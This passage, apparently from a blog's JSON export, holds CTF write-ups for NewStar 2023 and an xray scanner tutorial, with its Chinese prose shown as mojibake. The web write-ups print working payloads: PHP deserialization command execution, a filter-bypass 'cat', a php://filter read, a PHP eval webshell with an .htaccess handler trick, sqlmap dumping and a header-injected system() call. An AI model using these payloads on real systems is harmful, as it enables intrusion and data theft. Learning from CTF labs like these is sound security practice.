import *\n\nm = 2180240512138982889935733758776025289492848542072999905411903898302427496814336475436552230920326681809745778470583226987\nn = 25505131259827344749407187081729819350996141100990518281765117676936124636084125400315049858697199427401342785804654120926568235761577895862889807660442415521870277729420875825744007886870384790308986342360349597392841568418588521694478184632631896474390291958350681472768485356865513284619086754437723630874827593280089682939629265210875169009057935264259019861755270570945614034505771690412042781423771110441028258110022746603974882162934979726300741541857444013708508946471384525030286343828680432038605288717842755346907256658746733811881247992925881684393431852248253701825024590345480994598867741811599162649467\nS_ = 5510086561842250138908875342533294108331951659612671466695801343686972919443402163401521040457640602756777910081639191753436122171756174730531385913865951826869995984787102439679170684422717808771260217541439878677750508065703064081375473845405916674327932798153100574555933448570618732842365795738120491532398081467312017203933413296779070611024124965772787502242499016884537233028947865288037718074352448773759363242111080540630360902388540661831992776707600133253329779003707938065020121645530719140954554800986771763343191398210100325971573069812381693089384221441735278736889673500218274673196333806222266248844379127652366\nS = 11422623501509574650959962952004985925543723972567988534433510888436662069119800576321679344425052011563473005275801787271861671898318523033415642388512047035650991047953319601346912194462122313366888126100093635969476696871403883687946617575837061694813669883782221006701704487938500886952347003631626326127154081787016692856628561200386941683756397734100698520464199249811238013146899352390453500132666840606585760306723894654933077094375810666168464835756607377998959675132305971721109661644231613426322675350973373434138686086023265910883509514575554429502214217460059521619625693750938117427832654792355808803321\n\ne = 65537\np = GCD(pow(S_, e, n) - pow(m, 1, n), n)\nq = n // p\n\nprint('flag{' + md5(str(p).encode()).hexdigest() + '}')\nprint('flag{' + md5(str(q).encode()).hexdigest() + '}')\n\n```\n\n\n\n> å®˜æ–¹WriteUpï¼šhttps://shimo.im/docs/QPMRxzGktzsZnzhz\n","tags":["ctf","crypto","web"],"categories":["CTF","NewStar 2023"]},{"title":"xray-webscanä½¿ç”¨æ•™ç¨‹","url":"/xray-webscanä½¿ç”¨æ•™ç¨‹/","content":"\n# xray-webscan\n\n## å¿«é€Ÿä½¿ç”¨\n\n### æ‰«æä¸€ä¸ªç«™ç‚¹\n\næœ€ç®€å•çš„æ–¹å¼æ˜¯ç›´æ¥è°ƒç”¨ï¼Œæ‰«æä¸€ä¸ªæŒ‡å®šçš„ç«™ç‚¹ï¼Œå¦‚ï¼š\n\n```text\n./xray webscan --basic-crawler http://example.com/\n```\n\n> è¿™å¯èƒ½æ˜¯æœ€ç®€å•æœ€å¸¸ç”¨çš„ä¸€ä¸ªåŠŸèƒ½ï¼Œå°±æ˜¯å¤ªé•¿äº†ï¼Œä½“éªŒä¸å¤ªå‹å¥½ï¼Œå»ºè®®å¸¸ç”¨çš„åŒå­¦å¯ä»¥ `alias xray=\"/path/xray webscan --basic-crawler\"`\n\n### æŒ‡å®šæ‰«æè¾“å‡º\n\nä¸æŒ‡å®šè¾“å‡ºæ—¶ï¼Œé»˜è®¤è¾“å‡ºåˆ°æ§åˆ¶å°çš„æ ‡å‡†è¾“å‡ºä¸­ï¼Œå¯ä»¥åšç®¡é“å¤„ç†ï¼Œä¹Ÿå¯ä»¥é€‰æ‹©è¾“å‡ºä¸ºæ–‡ä»¶ï¼Œå¦‚ï¼š\n\n```text\n./xray webscan --url http://example.com/ --json-output report.json\n```\n\nä¸åŒå‚æ•°å¯¹åº”ä¸åŒçš„è¾“å‡ºæ–¹å¼ï¼š\n\n- æ— å‚æ•°ï¼šè¾“å‡ºåˆ°æ§åˆ¶å°çš„æ ‡å‡†è¾“å‡º\n- `--text-output`ï¼šè¾“å‡ºåˆ°æ–‡æœ¬æ–‡ä»¶ä¸­\n- `--json-output`ï¼šè¾“å‡ºåˆ° JSON æ–‡ä»¶ä¸­\n- `--html-output`ï¼šè¾“å‡ºåˆ° HTML æ–‡ä»¶ä¸­\n\n### åŸºäºä»£ç†çš„è¢«åŠ¨æ‰«æ\n\nxray å¯ä»¥é€šè¿‡ç±»ä¼¼ Burp çš„æ–¹å¼å¯åŠ¨ï¼Œåˆ©ç”¨ HTTP ä»£ç†æ¥æŠ“åŒ…æ‰«æï¼Œå¦‚ï¼š\n\n```text\n./xray webscan --listen 127.0.0.1:7777\n```\n\nå¦‚æœè¿è¡Œæ²¡æŠ¥ä»»ä½•é”™å°±å¯ä»¥è®¾ç½®æµè§ˆå™¨ HTTP ä»£ç†ä¸º `127.0.0.1:7777` äº†ï¼Œå…³äºå¦‚ä½•è®¾ç½®æµè§ˆå™¨ä»£ç†ï¼Œè¯·æ‰“å¼€ç™¾åº¦æœç´¢ â€œæµè§ˆå™¨è®¾ç½®ä»£ç†â€ã€‚\n\nä»£ç†è®¾ç½® OK ä»¥åå°±å¯ä»¥å¯åŠ¨ä»£ç†æ‰«æäº†ï¼Œè¿™æ—¶å€™æˆ‘ä»¬æ‰“æ¥æµè§ˆå™¨å°½æƒ…å†²æµªå§ï¼Œç†è®ºä¸Šæˆ‘ä»¬çš„é¼ æ ‡ç‚¹åˆ°å“ª xray å°±èƒ½æ‰«åˆ°å“ªã€‚\n\néœ€è¦æ³¨æ„ä¸€ä¸‹çš„æ˜¯ï¼Œå¾ˆå¤šæ—¶å€™è¿˜ä¼šæ‰«åˆ° HTTPS ç«™ç‚¹ï¼Œå¯èƒ½ä¼šå› ä¸ºæœ‰ä»£ç†è€Œå¯¼è‡´æ— æ³•è®¿é—®ï¼Œæˆ–è€…éœ€è¦æ‰‹åŠ¨ç¡®è®¤å®‰å…¨é£é™©ã€‚è¿™æ—¶å€™éœ€è¦æˆ‘ä»¬å¯¼å…¥ xray è¿è¡Œç›®å½•ä¸‹çš„ `ca.crt` è¯ä¹¦ï¼Œå…³äºå¦‚ä½•å¯¼å…¥ CA è¯ä¹¦ï¼Œè¯·æ‰“å¼€ç™¾åº¦æœç´¢ â€œå®‰è£…CAè¯ä¹¦â€ã€‚\n\n```text\nâœ   ls\nca.crt      ca.key      config.yaml xray\n```\n\n## é«˜çº§å§¿åŠ¿\n\n### æŒ‡å®šæ‰«ææ’ä»¶\n\nä½¿ç”¨ `--plugins` å‚æ•°å¯ä»¥é€‰æ‹©ä»…å¯ç”¨éƒ¨åˆ†æ‰«ææ’ä»¶ï¼Œå¤šä¸ªæ’ä»¶ä¹‹é—´å¯ä½¿ç”¨é€—å·åˆ†éš”ï¼Œå¦‚ï¼š\n\n```text\n./xray webscan --plugins cmd_injection --url http://example.com/\n```\n\nç›®å‰æä¾›çš„æ’ä»¶åˆ—è¡¨å¦‚ä¸‹ï¼š\n\n- SQL æ³¨å…¥æ£€æµ‹ (key: sqldet)\n  æ”¯æŒæŠ¥é”™æ³¨å…¥ã€å¸ƒå°”æ³¨å…¥å’Œæ—¶é—´ç›²æ³¨ç­‰\n- XSS æ£€æµ‹ï¼ˆkey: xssï¼‰\n  æ”¯æŒæ‰«æåå°„å‹ã€å­˜å‚¨å‹ XSS\n- å‘½ä»¤/ä»£ç æ³¨å…¥æ£€æµ‹ (key: cmd_injection)\n  æ”¯æŒ shell å‘½ä»¤æ³¨å…¥ã€PHP ä»£ç æ‰§è¡Œã€æ¨¡æ¿æ³¨å…¥ç­‰\n- ç›®å½•æšä¸¾ (key: dirscan)\n  æ£€æµ‹å¤‡ä»½æ–‡ä»¶ã€ä¸´æ—¶æ–‡ä»¶ã€debug é¡µé¢ã€é…ç½®æ–‡ä»¶ç­‰10ä½™ç±»æ•æ„Ÿè·¯å¾„å’Œæ–‡ä»¶\n- è·¯å¾„ç©¿è¶Šæ£€æµ‹ (key: path_traversal)\n  æ”¯æŒå¸¸è§å¹³å°å’Œç¼–ç \n- XML å®ä½“æ³¨å…¥æ£€æµ‹ (key: xxe)\n  æ”¯æŒæœ‰å›æ˜¾å’Œåè¿å¹³å°æ£€æµ‹\n- POC ç®¡ç† (key: phantasm)\n  é»˜è®¤å†…ç½®éƒ¨åˆ†å¸¸ç”¨çš„ POCï¼Œç”¨æˆ·å¯ä»¥æ ¹æ®éœ€è¦è‡ªè¡Œæ„å»º POC å¹¶è¿è¡Œã€‚å¯å‚è€ƒï¼š[POC ç¼–å†™æ–‡æ¡£](https://link.zhihu.com/?target=https%3A//chaitin.github.io/xray/%23/guide/poc)\n- æ–‡ä»¶ä¸Šä¼ æ£€æµ‹ (key: upload)\n  æ”¯æŒæ£€æµ‹å¸¸è§çš„åç«¯æœåŠ¡å™¨è¯­è¨€çš„ä¸Šä¼ æ¼æ´\n- å¼±å£ä»¤æ£€æµ‹ (key: brute_force)\n  æ”¯æŒæ£€æµ‹ HTTP åŸºç¡€è®¤è¯å’Œç®€æ˜“è¡¨å•å¼±å£ä»¤ï¼Œå†…ç½®å¸¸è§ç”¨æˆ·åå’Œå¯†ç å­—å…¸\n- JSONP æ£€æµ‹ (key: jsonp)\n  æ£€æµ‹åŒ…å«æ•æ„Ÿä¿¡æ¯å¯ä»¥è¢«è·¨åŸŸè¯»å–çš„ jsonp æ¥å£\n- SSRF æ£€æµ‹ (key: ssrf)\n  ssrf æ£€æµ‹æ¨¡å—ï¼Œæ”¯æŒå¸¸è§çš„ç»•è¿‡æŠ€æœ¯å’Œåè¿å¹³å°æ£€æµ‹\n- åŸºçº¿æ£€æŸ¥ (key: baseline)\n  æ£€æµ‹ä½ SSL ç‰ˆæœ¬ã€ç¼ºå¤±çš„æˆ–é”™è¯¯æ·»åŠ çš„ http å¤´ç­‰\n- ä»»æ„è·³è½¬æ£€æµ‹ (key: redirect)\n  æ”¯æŒ HTML meta è·³è½¬ã€30x è·³è½¬ç­‰\n- CRLF æ³¨å…¥ (key: crlf_injection)\n  æ£€æµ‹ HTTP å¤´æ³¨å…¥ï¼Œæ”¯æŒ queryã€body ç­‰ä½ç½®çš„å‚æ•°\n- â€¦\n\n### åªæ‰«æä¸€ä¸ª URL\n\nxray è¿˜æä¾›äº†æ–¹ä¾¿çš„åªæ‰«æä¸€ä¸ª URL çš„æ–¹å¼ï¼Œå¦‚ï¼š\n\n```text\n./xray webscan --url http://example.com/ --json-output out.json\n```\n","tags":["å·¥å…·","xray"],"categories":["åˆ©å…¶å™¨"]},{"title":"NewStar 2023 Week2","url":"/NewStar-WriteUp-Week2/","content":"\n# NewStar 2023 Week2 \n\n## WEB\n\n### æ¸¸æˆé«˜æ‰‹\n\n![image-20231009095418077](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231009095418077.png)\n\n1. æ‰“å¼€é¢˜ç›®çœ‹åˆ°ä¸Šè¿°ï¼Œæ˜¾ç„¶ä¸å¯èƒ½ç©åˆ°100000åˆ†ï¼Œé¦–å…ˆbpæŠ“åŒ…çœ‹çœ‹æœ‰ä»€ä¹ˆå‘ç°\n\n![image-20231009095513886](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231009095513886.png)\n\n2. ä¼¼ä¹æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨ä¿¡æ¯ï¼ŒæŸ¥çœ‹æºä»£ç ï¼Œå¥½åƒæœ‰æœ‰ç”¨ä¿¡æ¯`app_v2.js` jsæ–‡ä»¶\n\n![image-20231009095623116](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231009095623116.png)\n\n3. æŸ¥çœ‹jsæ–‡ä»¶äºæ˜¯æœ‰äº†æƒ³æ³•ï¼šæ˜¯å¦å¯ä»¥ç›´æ¥ä¿®æ”¹åŸå§‹çš„åˆ†æ•°\n\n![image-20231009095742045](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231009095742045.png)\n\n4. è°ƒè¯•å™¨ï¼Œåœ¨20è¡Œè®¾ç½®æ–­ç‚¹ï¼ŒF5åˆ·æ–°åï¼Œåœ¨æ§åˆ¶å°è¾“å…¥ï¼š`gameScore = 100000`\n\n![image-20231009095940757](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231009095940757.png)\n\n5. æ¥ç€è¿”å›è°ƒè¯•å™¨ï¼Œå¯ä»¥çœ‹åˆ°æ­¤æ—¶çš„`gameScore`çš„å€¼ä¸º100000\n\n![image-20231009100051189](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231009100051189.png)\n\n\n\n6. æ¥ç€F8,è®©jsä»£ç é¡ºåˆ©æ‰§è¡Œï¼Œè¿›å…¥æ¸¸æˆä¼šå‘ç°åŸå§‹åˆ†å˜æˆäº†100000ï¼Œç»“æŸæ¸¸æˆå³å¯å¾—åˆ°flag\n\n![image-20231009100224984](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231009100224984.png)\n\n### include 0ã€‚0\n\n1. æ‰“å¼€å°±çœ‹åˆ°æºç \n\n```php\n <?php\nhighlight_file(__FILE__);\n// Maybe you need learn some knowledge about deserialize?\nclass evil {\n    private $cmd;\n\n    public function __destruct()\n    {\n        if(!preg_match(\"/cat|tac|more|tail|base/i\", $this->cmd)){\n            @system($this->cmd);\n        }\n    }\n}\n\n@unserialize($_POST['unser']);\n?> \n```\n\n2. å‘ç°è¿‡æ»¤äº†`base`å’Œ`rot` ï¼Œä½†æ˜¯è¿˜æœ‰å…¶ä»–ä¸€äº›è¿‡æ»¤å™¨å¯ä»¥ç”¨\n3. æ„é€ **payloadï¼š**`php://filter//convert.iconv.SJIS*.UCS-4*/resource=flag.php`\n\n![image-20231017142837510](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231017142837510.png)\n\n4. æˆåŠŸæ‹¿åˆ°flag`flag{670e28dc-940b-4d66-92ec-40be4a0ae771}`\n\n### ez_sql\n\n1. çœ‹åˆ°é¢˜ç›®ï¼Œè‚¯å®šæ˜¯sqlæ³¨å…¥ç›¸å…³çš„ï¼Œç›´æ¥sqlmapæ‰«æ\n\n   `sqlmap -u \"http://a53134e7-8ebc-46e4-bc62-ac46e2b91837.node4.buuoj.cn:81/?id=TMP11503\" --dbs  `\n\n![image-20231010093655169](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010093655169.png)\n\n2. ç›´æ¥ä½¿ç”¨ `--dump`,åˆ—å‡ºæ‰€æœ‰çš„è¡¨æ•°æ®\n\n   ![image-20231010093800968](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010093800968.png)\n\nâ€‹\t`flag{ae2227f2-2ea1-4cd8-84b7-ad1d21cda25d}`\n\n### Unserialize?\n\n1. æ‰“å¼€çœ‹åˆ°æºç \n\n```php\n <?php\nhighlight_file(__FILE__);\n// Maybe you need learn some knowledge about deserialize?\nclass evil {\n    private $cmd;\n\n    public function __destruct()\n    {\n        if(!preg_match(\"/cat|tac|more|tail|base/i\", $this->cmd)){\n            @system($this->cmd);\n        }\n    }\n}\n\n@unserialize($_POST['unser']);\n?> \n```\n\n2. å‘ç°åªéœ€è¦è®¾ç½®evilç±»ä¸­cmdæˆå‘˜çš„å€¼ç„¶åååºåˆ—åŒ–è§¦å‘`__destruct`ææ„å‡½æ•°å³å¯è§¦å‘RCE\n\n3. å‘ç°è¿‡æ»¤äº†`cat|tac|more|tail|base`ï¼Œä½†æ˜¯å¯ä»¥ç”¨`ls` æŸ¥çœ‹ç›®å½•ï¼Œæ„é€ payload\n\n```php\n<?php\nclass evil{\n    public $cmd = 'ls';\n}\n$e = new evil();\necho urlencode(serialize($e));\n?>\n    \n    \n# è¿è¡Œç»“æœ\n  O%3A4%3A%22evil%22%3A1%3A%7Bs%3A3%3A%22cmd%22%3Bs%3A2%3A%22ls%22%3B%7D\n```\n\n![image-20231017143949315](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231017143949315.png)\n\n4. å‘ç°å½“å‰ç›®å½•åªæœ‰`index.php`,äºæ˜¯æŸ¥çœ‹æ ¹ç›®å½•\n\n```php\n<?php\nclass evil{\n    public $cmd = 'ls /';\n}\n$e = new evil();\necho urlencode(serialize($e));\n?>\n\n    \n# è¿è¡Œç»“æœ\n  O%3A4%3A%22evil%22%3A1%3A%7Bs%3A3%3A%22cmd%22%3Bs%3A4%3A%22ls+%2F%22%3B%7D\n```\n\n5. éœ€è¦æ³¨æ„çš„æ˜¯è¿è¡Œç»“æœä¸­æœ‰ + éœ€è¦å°†+æ”¹æˆ%20ï¼Œå¾—åˆ°æ ¹ç›®å½•\n\n   ![image-20231017144311370](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231017144311370.png)\n\n6. æ‰¾åˆ°å¯ç–‘ç›®å½•`th1s_1s_fffflllll4444aaaggggg`,ä½†æ˜¯catè¢«è¿‡æ»¤ï¼Œæƒ³åŠæ³•ç»•è¿‡\n\n```php\n<?php\nclass evil{\n    public $cmd = 'ca``t th1s_1s_fffflllll4444aaaggggg';\n}\n$e = new evil();\necho urlencode(serialize($e));\n?>\n\n    \n# è¿è¡Œç»“æœ\n O%3A4%3A%22evil%22%3A1%3A%7Bs%3A3%3A%22cmd%22%3Bs%3A36%3A%22ca%60%60t+%2Fth1s_1s_fffflllll4444aaaggggg%22%3B%7D\n```\n\n![image-20231017144727107](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231017144727107.png)\n\n### Upload again!\n\n![image-20231010094041762](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010094041762.png)\n\n1. é¦–å…ˆåˆ©ç”¨bpæŠ“åŒ…è¯•è¯•ï¼Œæ­£å¸¸ä¸Šä¼ å›¾ç‰‡æ­£å¸¸å›æ˜¾\n\n   ![image-20231010094343511](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010094343511.png)\n\n2. å°†å›¾ç‰‡åç¼€æ›´æ”¹ä¸ºphpï¼Œæ˜¾ç¤ºé”™è¯¯\n\n   ![image-20231010094430575](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010094430575.png)\n\n3. è¯•ç€ä¸Šä¼ å›¾ç‰‡é©¬ï¼Œè¿˜æ˜¯èƒ½æ£€æµ‹å‡ºæ¥\n\n   ![image-20231010094608740](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010094608740.png)\n\n4. çŒœæµ‹å¯èƒ½æ˜¯æ£€æµ‹äº†åç¼€ï¼Œä»¥åŠæ£€æµ‹å›¾ç‰‡å†…å®¹ä¸­æ˜¯å¦åŒ…å«äº†phpä»£ç ï¼Œè¯•ç€å»æ‰phpä»£ç \n\n   ![image-20231010094944563](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010094944563.png)\n\n5. ä»ç„¶è¢«æ£€æµ‹å‡ºæ¥ï¼Œç°åœ¨çŒœæµ‹å¯èƒ½æ˜¯ç”±äº`<? ?>`ï¼Œå»æ‰`<? ?>`,ä¿ç•™phpä¸­çš„ä»£ç ï¼Œå‘ç°èƒ½æˆåŠŸä¸Šä¼ \n\n   ![image-20231010095437194](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010095437194.png)\n\n6. **åˆ©ç”¨scriptä»£æ›¿<? ã€?>æ ‡ç­¾**\n\n   ```javascript\n   <script language=\"php\">@eval($_POST['111111']);</script>\n   ```\n\n\n7. ä½†æ˜¯ï¼Œå›¾ç‰‡ä¸­çš„phpä»£ç ä¸èƒ½è¢«è§£æï¼Œå°è¯•å…ˆä¸Šä¼ `.htaccess`æ–‡ä»¶ï¼Œåœ¨ä¸Šä¼ å¯¹åº”å›¾ç‰‡ï¼Œè¿™æ ·å›¾ç‰‡ä¸­çš„phpä»£ç å°±èƒ½è¢«è§£æ\n\n   ```htaccess\n   <FilesMatch \"evil.png\">\n   \n   SetHandler application/x-httpd-php\n   \n   </FilesMatch>\n   ```\n\n![image-20231010100336815](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010100336815.png)\n\n8. æ¥ç€ä¸Šä¼  `evil.png`æ–‡ä»¶\n\n   ![image-20231010100505136](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010100505136.png)\n\n9. æ¥ç€ç”¨èšå‰‘è¿æ¥ï¼ŒæŸ¥è¯¢å¯ç–‘æ–‡ä»¶\n\n   ![image-20231010101448421](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010101448421.png)\n\n   \n\n`flag{4366f19d-3ec5-4dec-801f-113d944e370a}`\n\n\n\n### R!!C!!E!!\n\næ ¹æ®æç¤ºæœ‰ä¿¡æ¯æ³„éœ²ï¼Œå¯ä»¥ä½¿ç”¨dirsearchæ‰«ï¼Œæ‰«å‡ºäº† /.git\n\nä½¿ç”¨githackå·¥å…·è·å–æºç \n\n![image-20231025154033987](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231025154033987.png)\n\nbo0g1pop.phpæºç ï¼š\n\n```php\n<?php\nhighlight_file(__FILE__);\nif (';' === preg_replace('/[^\\W]+\\((?R)?\\)/', '', $_GET['star'])) {\n    if(!preg_match('/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i',$_GET['star'])){\n        eval($_GET['star']);\n    }\n}\n```\n\næ ¹æ®æç¤ºç»•è¿‡ä¸¤å¤„æ­£åˆ™ï¼š\n\n- ç¬¬ä¸€ä¸ªæ­£åˆ™å¯¹æäº¤çš„å‚æ•°è¿›è¡Œå¤„ç†ï¼šä»»æ„å­—ç¬¦åŠ ä¸Šå¯é€‰çš„æ‹¬å·ï¼ˆå…è®¸åµŒå¥—ï¼‰æ›´æ¢ä¸ºç©ºï¼Œç„¶ååˆ¤æ–­æ˜¯å¦ç­‰äºåˆ†å·ï¼Œç»“åˆä¸‹é¢çš„ eval å¯ä»¥çŸ¥é“å°±æ˜¯æ— å‚æ•°å‘½ä»¤æ‰§è¡Œã€‚\n- ç¬¬äºŒä¸ªæ­£åˆ™è¿‡æ»¤äº†ä¸€äº›å¸¸ç”¨çš„ç”¨äºæ— å‚æ•°å‘½ä»¤æ‰§è¡Œçš„ php æ–¹æ³•ï¼Œä½†è¿‡æ»¤ä¸å…¨ï¼Œå¯ä»¥ä½¿ç”¨ç±»ä¼¼åŠŸèƒ½çš„æ–¹æ³•è¿›è¡Œç»•è¿‡ï¼Œæœ€ç»ˆå‘½ä»¤æ‰§è¡Œã€‚\n\nå®˜æ–¹payloadï¼ˆä½¿ç”¨ bp å‘é€çš„è¯·æ±‚ï¼‰ï¼š\n\n```bash\nGET /bo0g1pop.php?star=eval(pos(array_reverse(getallheaders()))); HTTP/1.1\nHost: faf83665-1a88-473a-b765-ddd33c6cf370.node4.buuoj.cn:81\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflateConnection: close\nX-Forwarder-Proto: system('cat /f*');\nUpgrade-Insecure-Requests: 1\n```\n\næœ‰ä¸€ç¯‡writeupå†™çš„å¾ˆå¥½ï¼šhttps://www.cnblogs.com/EddieMurphy-blogs/articles/17752305.html\n\n## Crypto\n\n### æ»´å•¤\n\n1. æ ¹æ®æç¤º åº”è¯¥è€ƒå¯Ÿçš„æ˜¯RSA `dpæ³„éœ²`\n\n   ![image-20231010151245060](http://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010151245060.png)\n\n2. çœ‹åˆ°æ³¨é‡Šçš„ä¸‰æ¡æ•°æ®ï¼Œå¤§æ¦‚ç‡å°±æ˜¯dpæ³„éœ²ï¼Œç¼–å†™dpæ³„éœ²è„šæœ¬\n\n```python \nimport gmpy2\nimport libnum\nn= 93172788492926438327710592564562854206438712390394636149385608321800134934361353794206624031396988124455847768883785503795521389178814791213054124361007887496351504099772757164211666778414800698976335767027868761735533195880182982358937211282541379697714874313863354097646233575265223978310932841461535936931\ne= 65537\nc= 52777705692327501332528487168340175436832109866218597778822262268417075157567880409483079452903528883040715097136293765188858187142103081639134055997552543213589467751037524482578093572244313928030341356359989531451789166815462417484822009937089058352982739611755717666799278271494933382716633553199739292089\ndp= 307467153394842898333761625034462907680907310539113349710634557900919735848784017007186630645110812431448648273172817619775466967145608769260573615221635\n\np=gmpy2.gcd(pow(2,e*dp,n)-2,n)\nprint(p)\n\nfor i in range(1, e):\n    p = (dp * e - 1) // i + 1\n    if n % p == 0:\n        q = n // p\n        print(q)\n        break\nprint(q)\nphi_n = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi_n)\nm = pow(c, d, n)\nprint(m)\nflag = libnum.n2s(int(m))\nprint(flag)\n```\n\n![image-20231010151350788](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010151350788.png)\n\n`flag{cd5ff82d-989c-4fbf-9543-3f98ab567546}`\n\n\n\n### ä¸æ­¢ä¸€ä¸ªpi\n\n1. åŒæ ·æ ¹æ®é¢˜ç›®å’Œç»™å‡ºçš„pythonä»£ç ï¼ŒçŒœæµ‹ä»ç„¶æ˜¯RSAä¸­çš„ `eå’Œphiä¸äº’ç´ `ï¼Œå³æ˜¯ å­˜åœ¨ä¸¤ä¸ªæˆ–å¤šä¸ªæ¨¡æ•°**ä¸”`gcd(N1,N2)!=1`** \n\n![image-20231010152809765](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010152809765.png)\n\n```python\nimport gmpy2\nimport libnum\n\np = 171790960371317244087615913047696670778115765201883835525456016207966048658582417842936925149582378305610304505530997833147251832289276125084339614808085356814202236463900384335878760177630501950384919794386619363394169016560485152083893183420911295712446925318391793822371390439655160077212739260871923935217\nq = 115478867870347527660680329271012852043845868401928361076102779938370270670897498759391844282137149013845956612257534640259997979275610235395706473965973203544920469416283181677660262509481282536465796731401967694683575843183509430017972506752901270887444490905891490955975762524187534052478173966117471143713\ne = 65537\nc = 4459183928324369762397671605317600157512712503694330767938490496225669985050002776253470841193156951087663107866714426230222002399666306287642591077990897883174134404896800482234781531592939043551832049756571987010173667074168282355520711905659013076509353523088583347373358980842707686611157050425584598825151399870268083867269912139634929397957514376826145870752116583185351576051776627208882377413433140577461314504762388617595282085102271510792305560608934353515552201553674287954987323321512852114353266359364282603487098916608302944694600227628787791876600901537888110093703612414836676571562487005330299996908873589228072982641114844761980143047920770114535924959765518365614709272297666231481655857243004072049094078525569460293381479558148506346966064906164209362147313371962567040047084516510135054571080612077333228195608109065475260832580192321853906138811139036658485688320161530131239854003996457871663456850196483520239675981391047452381998620386899101820782421605287708727667663038905378115235163773867508258208867367314108701855709002634592329976912239956212490788262396106230191754680813790425433763427315230330459349320412354189010684525105318610102936715203529222491642807382215023468936755584632849348996666528981269240867612068382243822300418856599418223875522408986596925018975565057696218423036459144392625166761522424721268971676010427096379610266649911939139451989246194525553533699831110568146220347603627745407449761792135898110139743498767543521297525802809254842518002190381508964357001211353997061417710783337\n\nn = p * q\nphi = (p - 1) * (q - 1)\n\nt = gmpy2.gcd(e, phi)\nt1 = e // t\ndt1 = gmpy2.invert(t1, phi)\nmt1 = pow(c, dt1, n)\nprint(mt1)\ns, m = gmpy2.iroot(mt1, t)\nprint(s)\nprint(libnum.n2s(int(s)))\n```\n\n![image-20231010152850074](http://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010152850074.png)\n\n`flag{bu_zhi_yige_p1dsaf}`\n\n### halfcandecode\n\nout.txtï¼š\n\n```bash\n113021375625152132650190712599981988437204747209058903684387817901743950240396649608148052382567758817980625681440722581705541952712770770893410244646286485083142929097056891857721084849003860977390188797648441292666187101736281034814846427200984062294497391471725496839508139522313741138689378936638290593969\n43054766235531111372528859352567995977948625157340673795619075138183683929001986100833866227688081563803862977936680822407924897357491201356413493645515962458854570731176193055259779564051991277092941379392700065150286936607784073707448630150405898083000157174927733260198355690620639487049523345380364948649\n4a8a08f09d37b73795649038408b5f33\n03c7c0ace395d80182db07ae2c30f034\ne1671797c52e15f763380b45e841ec32\nb14a7b8059d9c055954c92674ce60032\ne358efa489f58062f10dd7316b65649e\ncfcd208495d565ef66e7dff9f98764da\nb14a7b8059d9c055954c92674ce60032\n8fa14cdd754f91cc6554c9e71929cce7\n0cc175b9c0f1b6a831c399e269772661\n4a8a08f09d37b73795649038408b5f33\ne358efa489f58062f10dd7316b65649e\ncfcd208495d565ef66e7dff9f98764da\n4b43b0aee35624cd95b910189b3dc231\ncbb184dd8e05c9709e5dcaedaa0495cf\n\n```\n\ntask.py\n\n```python\nfrom Crypto.Util.number import *\nimport gmpy2\nfrom flag import flag\nimport os\nfrom hashlib import md5\n\ndef gen_prime(number):\n    p = getPrime(number // 2)\n    q = gmpy2.next_prime(p)\n    return p * q\n\ndef md5_hash(m):\n    return md5(m.encode()).hexdigest()\ne = 65537\nn = gen_prime(1024)\nm1 = bytes_to_long(flag[:len(flag) // 2].encode() + os.urandom(8))\nc1 = pow(m1, e, n)\nm2 = flag[len(flag) // 2:]\nwith open(\"out.txt\",\"w\") as f:\n    f.write(str(n) + '\\n')\n    f.write(str(c1) + '\\n')\n    for t in m2:\n        f.write(str(md5_hash(t))+'\\n')\n\n\n```\n\né¦–å…ˆåˆ¤æ–­æ˜¯RSA çš„åŠ å¯†ï¼Œæ ¹æ®æç¤ºï¼ŒçŒœæµ‹å¯èƒ½flagç”±ä¸¤ç«¯æ„æˆ\n\né¦–å…ˆå¤§ç´ æ•°åˆ†è§£,RSAè§£å¯†ï¼š\n\n```python\nimport gmpy2\nfrom Crypto.Util.number import *\n\n# å…¬é’¥e\ne = 65537\n\n# æ¬§æ‹‰å‡½æ•°eular euler = (p - 1) * (q - 1)\np = 10631151190024160908870967192522097752991652918777416177941351782447314225123009693276679810786266997133099934443701772661928189884235742113123409596993409\nq = 10631151190024160908870967192522097752991652918777416177941351782447314225123009693276679810786266997133099934443701772661928189884235742113123409596993841\n\neular = (p - 1) * (q - 